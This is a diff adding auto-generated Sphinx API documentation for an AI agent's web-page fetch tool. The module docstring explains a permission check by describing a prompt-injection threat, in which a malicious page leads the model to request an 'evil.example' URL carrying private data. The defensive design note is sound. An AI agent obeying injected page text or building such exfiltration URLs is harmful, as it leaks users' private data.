@@ -1,0 +1,44 @@
+voicemate.agent.tools.fetch
+===========================
+
+.. py:module:: voicemate.agent.tools.fetch
+
+.. autoapi-nested-parse::
+
+   Read a web page (cache-first by URL) and store it in research memory.
+
+   A page that the user's search did not list is opened only with the user's permission: a
+   malicious page could otherwise make the model request ``https://evil.example/?d=<private
+   data>`` and so carry data out in the address.
+
+
+
+Attributes
+----------
+
+.. autoapisummary::
+
+   voicemate.agent.tools.fetch.MAX_RETURN_CHARS
+
+
+Functions
+---------
+
+.. autoapisummary::
+
+   voicemate.agent.tools.fetch.build
+
+
+Module Contents
+---------------
+
+.. py:data:: MAX_RETURN_CHARS
+   :type:  int
+   :value: 6000
+
+
+.. py:function:: build(ctx: voicemate.agent.tools.base.ToolContext) -> list[langchain_core.tools.BaseTool]
+
+   Create the ``fetch_page`` tool.
+
+
